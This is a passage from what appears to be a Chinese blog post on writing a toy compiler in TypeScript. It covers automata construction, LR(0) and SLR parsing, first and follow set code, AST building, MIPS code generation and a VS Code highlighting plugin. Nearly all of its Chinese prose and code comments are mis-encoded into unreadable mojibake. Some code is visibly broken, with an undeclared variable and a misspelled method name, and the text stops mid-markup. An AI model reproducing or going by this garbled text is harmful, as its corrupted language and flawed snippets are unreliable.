mutipliy(res);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸è¿‡æ¯”è¾ƒå›°æ‰°çš„æ˜¯è¿™äº›èŠ‚ç‚¹çš„æ•°æ®ç»“æ„å¦‚ä½•å­˜å‚¨æ˜¯ä¸€ä»¶è¦è€ƒè™‘å‘¨åˆ°çš„äº‹ï¼šéœ€è¦èŠ‚ç‚¹idï¼Œç”±äºè‡ªåŠ¨æœºæ˜¯æœ‰å‘å›¾ï¼Œå¹¶ä¸”å¯èƒ½å¸¦ç¯ï¼Œå¹¶ä¸”èŠ‚ç‚¹å’ŒèŠ‚ç‚¹ä¹‹é—´å¯èƒ½å­˜åœ¨ä¸æ­¢ä¸€æ¡è¾¹ï¼Œè€ƒè™‘äº†ä¸‹ï¼Œè¿˜æ˜¯ç”¨linjieè¡¨å­˜å‚¨(ä¸»è¦æ˜¯ç¬¬ä¸€ç‰ˆçš„ä»£ç æ˜¯è¿™æ ·çš„ï¼Œå†åŠ ä¸Šå¦‚æœæ„Ÿè§‰èŠ‚ç‚¹ä¹‹é—´çš„è¿æ¥å¯èƒ½åœ¨æŸäº›æƒ…å†µä¸‹æ¯”è¾ƒå°‘ï¼Œä¸´ç•ŒçŸ©é˜µæ¯”è¾ƒæµªè´¹å†…å­˜)ï¼ŒfirstEdgeæŒ‡å‘å…¶æ‰€æœ‰çš„ä¸´ç•Œè¾¹ï¼ŒedgeVal æ˜¯è¾¹ä¸Šçš„å€¼ï¼Œå¯¹äºè¯¥å›¾çš„æœç´¢ï¼Œä½¿ç”¨bfs+dfs+æ£€æµ‹ç¯ã€‚ é€šè¿‡ä»¥ä¸Šæµç¨‹ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ª nfaï¼Œç”±è¯¥ nfaå¯ä»¥å¾—åˆ°å„ä¸ªèŠ‚ç‚¹çš„è¾¹ï¼Œä»¥åŠå¶å­èŠ‚ç‚¹(å¹¶ä¸”å¶å­èŠ‚ç‚¹ä¸Šæ”¾ç½®äº†ç›¸åº”çš„åŠ¨ä½œ)</p><p>nfa =&gt; dfa:è¿™ä¸€æ­¥ä½¿ç”¨çš„æ˜¯è™ä¹¦ä¸Šçš„ç®—æ³•ï¼Œè¿™é‡Œä¸è¿‡å¤šæè¿°ï¼Œç®€å•æ¥è¯´å°±æ˜¯æŠŠå¾ˆå¤šä¸ªå¤§çš„ nfaè”åˆæ„å»ºæˆä¸€ä¸ª dfa ä»è€Œå¾—åˆ°ä¸€å¼ çŠ¶æ€è½¬ç§»è¡¨</p><h2 id="ä¸‰æ„å»ºæŠ½è±¡è¯­æ³•æ ‘">ä¸‰ã€æ„å»ºæŠ½è±¡è¯­æ³•æ ‘</h2><p>è¿™é‡Œæˆ‘ç”¨çš„æ˜¯ç®€å•çš„LR(0)ä¸Šä¸‹æ— å…³æ–‡æ³•ï¼Œå…³äºä»€ä¹ˆæ˜¯ä¸Šä¸‹æ— å…³æ–‡ä»€ä¹ˆæ˜¯æœ‰å…³æ–‡ï¼Œè¯·æˆ³-&gt;,ç†è®ºä¸Šä¸Šä¸‹æ— å…³æ–‡æ³•LR(1) &gt; LSPR &gt; SLR &gt; LR(0) LR(0): æ²¡æœ‰æå‰é¢„æµ‹çš„ç¬¦å·ï¼Œå®¹æ˜“å‡ºç°shift-reduce å†²çªä»¥åŠ reduce-reduce å†²çªï¼Œæ‰€ä»¥éœ€è¦è®¾è®¡é€‚åˆçš„æ–‡æ³•ï¼› SLR:æœ‰ç®€å•çš„é¢„æµ‹ï¼Œå¯ä»¥è§£å†³ shift-reduce å†²çªï¼Œä½†æ˜¯æ— æ³•è§£å†³ reduce-reduceå†²çª LR(1): å¯ä»¥è§£å†³ shift-reduce å†²çªï¼Œä¹Ÿè§£å†³ reduce-reduce å†²çª LSPR:ç”±äº LR(1)çš„è¡¨ç‰¹åˆ«å¤§ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šåšäº†ä¼˜åŒ–</p><p>æ ¹æ®ç›¸åº”æ–‡æ³•ç”Ÿæˆ astï¼Œæœ¬è´¨ä¸Šæ˜¯åˆ©ç”¨æ ˆå’Œ nfaï¼Œçœ‹å¦‚ä¸‹æ–‡æ³•çš„LR(0)ç”Ÿæˆè¿‡ç¨‹ï¼š E-&gt; Program $ Program -&gt; Assign == Assign Assign-&gt; Assign + Token Assign -&gt; Token Token -&gt; id</p><p>LR(0)dfa</p><p><img src="../é£ä¹¦20230430-125517.jpg" /></p><p>LR(0)å¯¹åº”çš„çŠ¶æ€è½¬ç§»è¡¨ï¼š <img src="../é£ä¹¦20230430-124728.jpg" /></p><p>å¯ä»¥çœ‹åˆ°åœ¨çŠ¶æ€ 9 æ˜¯å­˜åœ¨ç§»ä½-è§„çº¦å†²çªçš„ï¼Œè¿™æ˜¯å› ä¸ºLR(0)é»˜è®¤åœ¨æ‰€æœ‰çš„ç»ˆç»“ç¬¦å·å¤„åšè§„çº¦ï¼Œslr è¯­æ³•æ˜¯æ¯”LR(0),æ›´ä¸ºå¹¿æ³›çš„ä¸€ç§è¯­æ³•ï¼Œå®ƒåªåœ¨ç‰¹å®šçš„åœ°æ–¹æ”¾ç½®è§„çº¦åŠ¨ä½œã€‚å…·ä½“æ¥è¯´ï¼Œåœ¨ä¸Šé¢çš„ä¾‹å­é‡Œï¼Œåœ¨çŠ¶æ€9 å¤„ï¼Œåªæœ‰è§„çº¦å¼ 1 çš„ç§»ä½æŒ‡é’ˆåˆ°è¾¾é‡Œæœ«å°¾ï¼Œæ‰€ä»¥å¯ä»¥çœ‹ä¸‹è§„çº¦å¼ 1åé¢å¯èƒ½ä¼šç´§æ¥ç€ä»€ä¹ˆç¬¦å·ï¼Œä¹Ÿå°±æ˜¯ followSet(Program) ={$}ï¼Œæ‰€ä»¥åªåœ¨$å¤„æ”¾ç½®è§„çº¦åŠ¨ä½œã€‚ ä¸‹é¢æ˜¯ slr åˆ†æè¡¨ï¼š <imgsrc="../é£ä¹¦20230430-163301.jpg" /></p><p>æœ‰äº†è¿™å¼ è¡¨å°±å¯ä»¥åŸºäºè¾“å…¥(ä¸€èˆ¬æ˜¯ tokenæµ)å»åšè¯­æ³•åˆ†æäº†ï¼Œåˆ·è¿‡ç®—æ³•é¢˜çš„éƒ½åº”è¯¥çŒœåˆ°äº†ä¼šç”¨æ ˆæ¥ä½œä¸ºæ•°æ®ç»“æœï¼Œæ˜¯çš„ï¼Œæ¯ä¸€æ¬¡è‡ªåº•å‘ä¸Šè§„çº¦éƒ½å¯ä»¥çœ‹ä½œæ˜¯æ ˆçš„popåŠ¨ä½œï¼Œå¹¶ä¸”åœ¨è¿™æ¬¡åŠ¨ä½œä¸­å¯ä»¥åšå¾ˆå¤šäº‹æƒ…ï¼Œæ¯”å¦‚ç”Ÿæˆæˆ‘ä»¬æƒ³è¦çš„æ ‘èŠ‚ç‚¹ï¼Œå¦‚ï¼š</p><p>åœ¨è®¾è®¡ AST ç»“æ„çš„åŒæ—¶éœ€è¦åŒæ—¶å…¼é¡¾åˆ° ASTçš„ç»“æ„æ–¹ä¾¿è¯­ä¹‰åˆ†æå’Œä»£ç ç”Ÿæˆï¼Œè¯¥è¯­è¨€çš„ ast ç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs node">Program_Class &#123;<br>  expr: Function_Class &#123;<br>    formal_list: [ &#x27;x&#x27; ],<br>    name: &#x27;total&#x27;,<br>    expressions: Branch_Class &#123;<br>      ifCond: Cond_Class &#123;<br>        lExpr: Indentifier_Class &#123; token: &#x27;x&#x27; &#125;,<br>        rExpr: Int_Contant_Class &#123; token: &#x27;0&#x27; &#125;,<br>        op: &#x27;==&#x27;<br>      &#125;,<br>      statementTrue: Return_Class &#123; expr: Indentifier_Class &#123; token: &#x27;x&#x27; &#125; &#125;,<br>      statementFalse: Assign_Class &#123;<br>        name: &#x27;m&#x27;,<br>        ltype: &#x27;int&#x27;,<br>        r: Caller_Class &#123;<br>          params_list: [ undefined ],<br>          id: &#x27;total&#x27;,<br>          params: Sub_Class &#123;<br>            lvalue: Indentifier_Class &#123; token: &#x27;x&#x27; &#125;,<br>            rvalue: Int_Contant_Class &#123; token: &#x27;1&#x27; &#125;<br>          &#125;,<br>          next: undefined<br>        &#125;,<br>        next: Return_Class &#123;<br>          expr: Add_Class &#123;<br>            lvalue: Indentifier_Class &#123; token: &#x27;x&#x27; &#125;,<br>            rvalue: Indentifier_Class &#123; token: &#x27;m&#x27; &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;,<br>    formals: Formal_Class &#123; name: &#x27;x&#x27;, type: &#x27;int&#x27;, next: undefined &#125;,<br>    next: Function_Class &#123;<br>      formal_list: [ &#x27;x&#x27;, &#x27;y&#x27; ],<br>      name: &#x27;sum&#x27;,<br>      expressions: Return_Class &#123;<br>        expr: Add_Class &#123;<br>          lvalue: Indentifier_Class &#123; token: &#x27;x&#x27; &#125;,<br>          rvalue: Indentifier_Class &#123; token: &#x27;y&#x27; &#125;<br>        &#125;<br>      &#125;,<br>      formals: Formal_Class &#123;<br>        name: &#x27;y&#x27;,<br>        type: &#x27;int&#x27;,<br>        next: Formal_Class &#123; name: &#x27;x&#x27;, type: &#x27;int&#x27;, next: undefined &#125;<br>      &#125;,<br>      next: Function_Class &#123;<br>        formal_list: [],<br>        name: &#x27;main&#x27;,<br>        expressions: Assign_Class &#123;<br>          name: &#x27;x&#x27;,<br>          ltype: &#x27;int&#x27;,<br>          r: Caller_Class &#123;<br>            params_list: [ &#x27;10&#x27; ],<br>            id: &#x27;total&#x27;,<br>            params: Int_Contant_Class &#123; token: &#x27;10&#x27; &#125;,<br>            next: undefined<br>          &#125;,<br>          next: Caller_Class &#123;<br>            params_list: [ &#x27;x&#x27; ],<br>            id: &#x27;print&#x27;,<br>            params: Indentifier_Class &#123; token: &#x27;x&#x27; &#125;,<br>            next: undefined<br>          &#125;<br>        &#125;,<br>        formals: undefined,<br>        next: undefined,<br>        return_type: &#x27;int&#x27;<br>      &#125;,<br>      return_type: &#x27;int&#x27;<br>    &#125;,<br>    return_type: &#x27;int&#x27;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶æ ‘èŠ‚ç‚¹æ˜¯å„ç§è¡¨è¾¾å¼ç±»ï¼Œæºç åœ¨ tree.ts æ–‡ä»¶é‡Œï¼Œ</p><p>followé›†å’Œfirsté›†ç”Ÿæˆï¼š followé›†ï¼š <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs node">_processFollow(_nts: string) &#123;<br>  // 3 è‹¥å­˜åœ¨ä¸€ä¸ªè¡¨è¾¾å¼ X -&gt; ABCD åˆ™ Follow(A) éœ€è¦åŠ ä¸Š First(B) - Îµï¼Œè‹¥First(B) åŒ…å« Îµï¼Œåˆ™Follow(A) éœ€è¦åŠ ä¸Š First(C) - Îµï¼Œå‘å³è¿­ä»£... è¿­ä»£è‡³è¡¨è¾¾å¼ç»“æŸã€‚<br>  for (const nts of this.nonTerminalSymbol) &#123;<br>    for (let grammarArr of this.lfh2rfh.get(nts)) &#123;<br>    <br>      const len = grammarArr.value.length;<br>      let index = -1;<br>      // æ‰¾åˆ° B<br>      for (let i = 0; i &lt; len; i += 1) &#123;<br>        const ch = grammarArr.value[i];<br>        if (ch === _nts) &#123;<br>          index = i;<br>          break;<br>        &#125;<br>      &#125;<br>      if (index === -1) continue;<br>      while (index + 1 &lt; len) &#123;<br>        const ch = grammarArr.value[index + 1];<br>        if (this.terminalSymbol.has(ch)) &#123;<br>          // ç»ˆç»“ç¬¦ç›´æ¥åŠ å…¥<br>          this._followSet[_nts].add(ch);<br>          break;<br>        &#125; else &#123;<br>          const set = this._firstSet[ch];<br>          for (const v of Array.from(set || []))<br>            if (v !== EMPTY) this._followSet[_nts].add(v);<br>          if (!set?.has(EMPTY)) break;<br>          index += 1;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br>startBuildFollowSet() &#123;<br>  for (let nts of this.nonTerminalSymbol) &#123;<br>    this._followSet[nts] = new Set();<br>  &#125;<br>  this._followSet[START].add(END);<br>  while (true) &#123;<br>    let flag = false;<br>    for (let nts of this.nonTerminalSymbol) &#123;<br>      this._processFollow(nts);<br>      if (isEqual(prevFollowSet, this._followSet)) flag = true;<br>      else flag = false;<br>      prevFollowSet = cloneDeep(this._followSet);<br>    &#125;<br>    if (flag) break;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs node">// æ±‚firseté›†è¿™é‡Œåšäº†ç‚¹æ”¹åŠ¨ï¼Œä¸€èˆ¬éœ€è¦æ‰‹åŠ¨æ¶ˆé™¤å·¦é€’å½’æ–‡æ³•ï¼Œè¿™é‡Œåœ¨ä»£ç é‡Œå¦‚æœé‡åˆ°äº†å·¦é€’å½’ç›´æ¥ç»“æŸ<br>_processFirst(nts: string, memo: Set&lt;string&gt;) &#123;<br>  memo.add(nts);<br>  for (const grammarArr of this.lfh2rfh.get(nts)) &#123;<br>    const len = grammarArr.value.length;<br>    for (let i = 0; i &lt; len; i += 1) &#123;<br>      const ch = grammarArr.value[i];<br>      if (this.terminalSymbol.has(ch)) &#123;<br>        this._firstSet[nts].add(ch);<br>        break;<br>      &#125; else &#123;<br>        if (i === 0 &amp;&amp; ch === nts) &#123;<br>          // é¿å…å·¦é€’å½’<br>          break;<br>        &#125;<br>        if (memo.has(ch)) &#123;<br>          // é¿å…å¾ªç¯é€’å½’<br>          break;<br>        &#125;<br>        <br>        this._processFirst(ch, memo);<br>        for (const v of this._firstSet[ch]) this._firstSet[nts].add(v);<br>        if (!this._firstSet[ch].has(EMPTY)) break;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br>startuildFirstSet() &#123;<br>  for (let nts of this.nonTerminalSymbol) this._firstSet[nts] = new Set();<br>  for (let nts of this.nonTerminalSymbol) &#123;<br>    const memo = new Set([]);<br>    this._processFirst(nts, memo);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="äº”astç”Ÿæˆ">äº”ã€ASTç”Ÿæˆ</h2><p>å¦‚ä¸‹æ‰€ç¤ºï¼Œåœ¨æå‰å®šä¹‰å¥½çš„æ–‡æ³•äº§ç”Ÿå¼åšå¯¹åº”çš„è§„çº¦åŠ¨ä½œï¼Œå¦‚ä¸‹case0å°±æ˜¯<code>Formals -&gt; int,TOKEN.ID</code>ï¼Œåœ¨è¿™é‡Œåˆ©ç”¨æ ˆå†…çš„å…ƒç´ ç”ŸæˆFormal_Classï¼›å°±è¿™æ ·æ¯æ¬¡åœ¨å¯¹åº”çš„æ–‡æ³•äº§ç”Ÿå¼ä¸Šå¯¹å¯¹åº”çš„åšè§„çº¦åŠ¨ä½œï¼Œä»è€Œå®Œæˆè‡ªåº•å‘ä¸Šçš„astçš„æ„å»º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs node">[Formals -&gt; int, TOKEN.ID]: 0,<br>[Formals -&gt; Formals, &#x27;,&#x27;, int, TOKEN.ID]: 1<br><br>case 0:<br>  res = new Formal_Class(yyvalsp[0][2], yyvalsp[1][2]);<br>  break;<br>case 1:<br>  res = new Formal_Class(yyvalsp[0][2], yyvalsp[1][2], yyvalsp[3]);<br>  break;<br><br></code></pre></td></tr></table></figure><h2 id="å…­è¯­ä¹‰åˆ†æ">å…­ã€è¯­ä¹‰åˆ†æ</h2><p>åœ¨è¯­ä¹‰åˆ†æé˜¶æ®µå¯ä»¥åšç±»å‹æ£€æŸ¥å’ŒåŸºæœ¬çš„æ ¡éªŒï¼Œè¿™é‡Œæ”¾ç½®äº†ä¸€äº›åŸºæœ¬çš„ç±»å‹æ£€æŸ¥åŠ¨ä½œï¼š1. å¿…é¡»è¦æœ‰mainå‡½æ•°ï¼Œmainå‡½æ•°çš„è¿”å›å€¼å¿…é¡»æ˜¯æ•´å½¢ 2.å…¶ä»–å‡½æ•°çš„è¿”å›å€¼å’Œå®é™…è¿”å›å€¼ç±»å‹å¯¹åº” 3. èµ‹å€¼è¯­å¥å·¦å³ä¸¤ä¾§ç±»å‹ä¸€è‡´ 4.åŒä¸€ä¸ªä½œç”¨åŸŸä¸å¾—å‡ºç°åŒåå˜é‡ 5. å˜é‡å¿…é¡»å…ˆå£°æ˜å¹¶åˆå§‹åŒ–æ‰èƒ½ä½¿ç”¨</p><h2 id="ä¸ƒæ±‡ç¼–ä»£ç ç”Ÿæˆ">ä¸ƒã€æ±‡ç¼–ä»£ç ç”Ÿæˆ</h2><p>æ€è·¯ï¼šè‡ªä¸Šå‘ä¸‹è¿›è¡Œåˆ©ç”¨å †æ ˆæœºä»£ç ç”Ÿæˆï¼Œä»…ä½¿ç”¨äº†3ä¸ªå¯„å­˜å™¨ï¼Œa0ï¼Œv0ï¼Œt0ï¼Œå…¶ä¸­v0æ˜¯è¾…åŠ©å¯„å­˜å™¨å¸®åŠ©å‡½æ•°è¿”å›å€¼å­˜å‚¨ä»¥åŠç³»ç»Ÿè°ƒç”¨çš„é€€å‡ºå’Œæ‰“å°ï¼›æ€»ç»“äº†ä¸‹ï¼Œæœ€é‡è¦çš„ç‚¹æ˜¯å¯¹å£°æ˜å˜é‡çš„å†…å­˜åˆ†é…ä»¥åŠå–å˜é‡çš„æ—¶å€™ï¼Œè¦çŸ¥é“å¯¹åº”çš„ä½œç”¨åŸŸé“¾ï¼Œè¯¥ä»å“ªä¸ªä½œç”¨å–ï¼Œåªè¦æˆ‘ä»¬å¯¹åŸºæœ¬çš„ä¸€äº›å•å…ƒè¡¨è¾¾å¼åšå¥½äº†ä»£ç ç”Ÿæˆçš„å·¥ä½œï¼Œåé¢å°±æ˜¯æ­ç§¯æœ¨çš„å·¥ä½œäº†ï¼›ä¸‹é¢æ˜¯è¯¥è¯­è¨€çš„å‡½æ•°æ ˆç¤ºæ„å›¾ï¼š<img src="../é£ä¹¦20230502-104729.jpg" /></p><p>è¿™é‡Œå¦‚ä½•å–å‚æ•°ï¼Ÿç”±äºå‡½æ•°æ ˆåœ¨æ‰©å¢çš„æ—¶å€™ï¼Œä¸å¤ªæ–¹ä¾¿é€šè¿‡spæŒ‡é’ˆè·å–å‚æ•°å’Œå˜é‡çš„å­˜å‚¨ä½ç½®ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨fpæŒ‡é’ˆå»ä½œä¸ºåŸºåœ°å€ï¼Œå¯»æ‰¾å‚æ•°å’Œå±€éƒ¨å˜é‡</p><p>å…³äºä½œç”¨åŸŸé—®é¢˜æ˜¯é‡‡ç”¨çš„æ ‘ç»“æ„å­˜å‚¨(åŒå‘é“¾è¡¨)ï¼Œæ¯æ¬¡ä»å½“å‰æ‰€åœ¨ä½œç”¨åŸŸå†…å¯»æ‰¾å˜é‡ï¼Œå†ç»§ç»­ä¾æ¬¡å‘ä¸Šå¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°å‡½æ•°çº§ä½œç”¨åŸŸï¼›</p><p>ä»¥ä¸‹æ˜¯å…·ä½“çš„å‡ ä¸ªå•å…ƒè¡¨è¾¾å¼ç”Ÿæˆçš„ä¾‹å­ï¼š</p><p>a + b lw $a0 å±€éƒ¨ or å‚æ•° / li $a0, imm sw $a0, 0($29) addiu $29,$29, -4 lw $a0 å±€éƒ¨ or å‚æ•° / li $a0, imm add $a0, $t0, $a0</p><p>å¯¹äºint x = 2ï¼Œç›´æ¥ç”¨liå‘½ä»¤å­˜å‚¨ï¼Œå¹¶åœ¨å‡½æ•°çš„å±€éƒ¨å˜é‡å¤„å‘å‡½æ•°æ ˆå†…æ”¾ç½®å…ƒç´ ; å¯¹äºint x = a + b,å…ˆåˆ©ç”¨a+bå…ƒè¡¨è¾¾å¼ç”Ÿæˆå¯¹åº”çš„ä»£ç ï¼Œå†ç”¨lwæŒ‡ä»¤å­˜å‚¨å•å…ƒè¡¨è¾¾å¼çš„å€¼ï¼Œ</p><h2 id="å…«ç¼–å†™ä»£ç é«˜äº®è¯­æ³•æ’ä»¶">å…«ã€ç¼–å†™ä»£ç é«˜äº®è¯­æ³•æ’ä»¶ï¼š</h2><p>æˆ‘è¿™é‡Œæ˜¯é€Ÿæˆç‰ˆï¼Œæ¯”è¾ƒç®€å•ï¼Œåªæ¶‰åŠç®€å•çš„è¯­æ³•éƒ¨åˆ† éœ€è¦å®‰è£…ï¼š<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ npm <span class="hljs-keyword">install</span> -g vsce<br>$ npm <span class="hljs-keyword">install</span> -g yo<br></code></pre></td></tr></table></figure></p><p>å¦‚æœæ˜¯éœ€è¦ç¼–å†™å…¨æ–°çš„æ’ä»¶ï¼Œåˆ™å…è®¸ï¼š yo code é€‰æ‹© new LanguageSupportï¼Œæç¤ºä¸€äº›é—®é¢˜ï¼ŒæŒ‰éœ€å¡«å†™å³å¯ï¼Œæ’ä»¶åç§°å°½å¯èƒ½å”¯ä¸€ï¼Œä¸ç„¶åœ¨æ’ä»¶å¸‚åœºé‡Œä¸å¥½æœï¼Œè¿è¡Œå®Œå‘½ä»¤ä¹‹åä¼šæœ‰ä¸€ä¸ªç”Ÿæˆç›®å½•ï¼Œç¼–å†™é«˜äº®è¯­æ³•çš„æ–‡ä»¶åœ¨xxx.tmLanguage.json æ–‡ä»¶é‡Œï¼Œå¦‚æœä½ åªæ˜¯é…ç½®ä¸€ä¸ª VS Codeä¸­å·²æœ‰è¯­è¨€çš„è¯­æ³•ï¼Œè®°å¾—åˆ æ‰ç”Ÿæˆçš„ package.json ä¸­çš„ languages é…ç½®ã€‚</p><p>https://www.bookstack.cn/read/VS-Code-Extension-Doc-ZH/docs-language-extensions-syntax-highlight-guide.md#fu57uu(ç¼–å†™æ’ä»¶vscode)</p><p>è¿™é‡Œçœ‹ä¸‹æˆ‘çš„è§„åˆ™ï¼š</p><p>ä»¥åŠvscodeé‡Œçš„settings.jsonæ–‡ä»¶ï¼š <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;editor.tokenColorCustomizations&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;[Default Dark+]&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-comment">// è¿™é‡Œæ˜¯è‡ªå·±æ‰€é€‰æ‹©çš„ä¸»é¢˜é¢œè‰²ï¼Œæˆ‘çš„æ˜¯vscodeé»˜è®¤çš„é¢œè‰²</span><br>    <span class="hljs-attr">&quot;textMateRules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;scope&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;identifier.name&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// è‡ªå®šä¹‰æˆ–è€…ç¬¦åˆæ ‡å‡†è§„èŒƒçš„å‘½åï¼Œå¯¹åº”æ’ä»¶é‡Œçš„xxx.tmLanguage.jsonæ–‡ä»¶é‡Œçš„nameé€‰é¡¹</span><br>        <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;foreground&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#33ba8f&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;scope&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;id.name.mc&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;foreground&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#eb8328&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>xxx.tmLanguage.jsoné‡Œçš„é…ç½®ï¼š <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 